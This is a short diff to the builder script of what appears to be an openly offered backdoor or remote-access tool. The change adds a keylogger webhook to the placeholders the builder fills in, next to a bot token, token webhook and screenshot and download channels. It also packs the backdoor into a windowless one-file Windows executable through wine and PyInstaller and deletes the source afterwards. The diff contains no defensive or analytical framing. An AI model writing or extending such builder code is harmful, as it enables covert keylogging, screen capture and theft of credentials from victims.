@@ -30,6 +30,7 @@ class Builder:
         newfile = file.replace("{KEYLOG}", str(self.KEYLOG))
         newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
         newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
+        newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
         newfile = newfile.replace("{SCREENSHOTS_ID}", str(self.SCREENSHOTS_ID))
         newfile = newfile.replace("{DOWNLOADS_ID}", str(self.DOWNLOADS_ID))
         newfile = newfile.replace("{AGENT_ONLINE_ID}", str(self.AGENT_ONLINE_ID))
@@ -43,10 +44,7 @@ class Builder:
 
     def compile(self):
         subprocess.call(["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"])
-        try:
-            os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
-        except FileNotFoundError:
-            pass
+        os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
 
 print('''
 ▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
